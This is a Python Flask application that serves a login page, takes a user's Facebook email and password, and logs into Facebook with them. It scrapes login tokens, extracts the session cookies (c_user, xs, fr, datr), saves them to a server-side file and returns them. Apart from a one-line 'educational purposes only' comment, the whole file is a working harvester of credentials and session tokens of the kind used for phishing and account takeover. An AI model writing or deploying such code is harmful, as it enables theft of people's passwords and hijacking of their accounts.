from flask import Flask, render_template, request, jsonify
import os
import requests
import re

app = Flask(__name__)

# Handle both GET and HEAD requests
@app.route('/', methods=['GET', 'HEAD'])
def home():
    if request.method == 'HEAD':
        return '', 200
    return render_template('login.html')

@app.route('/extract_cookies', methods=['POST'])
def extract_cookies():
    try:
        email = request.form.get('email')
        password = request.form.get('password')
        
        # Security warning (educational purposes only)
        if not email or not password:
            return jsonify({
                'success': False,
                'message': 'Email and password are required'
            })

        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Get login page
        login_page = session.get('https://www.facebook.com/login', headers=headers)
        
        # Extract required tokens
        fb_dtsg = re.search(r'name="fb_dtsg" value="([^"]+)"', login_page.text)
        jazoest = re.search(r'name="jazoest" value="([^"]+)"', login_page.text)
        
        if not fb_dtsg or not jazoest:
            return jsonify({
                'success': False,
                'message': 'Failed to extract Facebook tokens'
            })

        # Prepare login data
        login_data = {
            'email': email,
            'pass': password,
            'fb_dtsg': fb_dtsg.group(1),
            'jazoest': jazoest.group(1),
            'login': 'Log In'
        }
        
        # Submit login
        response = session.post(
            'https://www.facebook.com/login',
            data=login_data,
            headers=headers,
            allow_redirects=True
        )
        
        # Check if login successful
        if 'c_user' in session.cookies:
            cookies = {
                'c_user': session.cookies.get('c_user'),
                'xs': session.cookies.get('xs'),
                'fr': session.cookies.get('fr', ''),
                'datr': session.cookies.get('datr', '')
            }
            
            # Save cookies to file
            with open('cookies.txt', 'w') as f:
                f.write(f"c_user={cookies['c_user']}; xs={cookies['xs']}; fr={cookies['fr']}; datr={cookies['datr']}")
            
            return jsonify({
                'success': True,
                'cookies': cookies,
                'message': 'Cookies extracted successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Login failed. Check credentials or try manual method.'
            })
            
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error: {str(e)}'
        })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 4000))
    app.run(host='0.0.0.0', port=port)
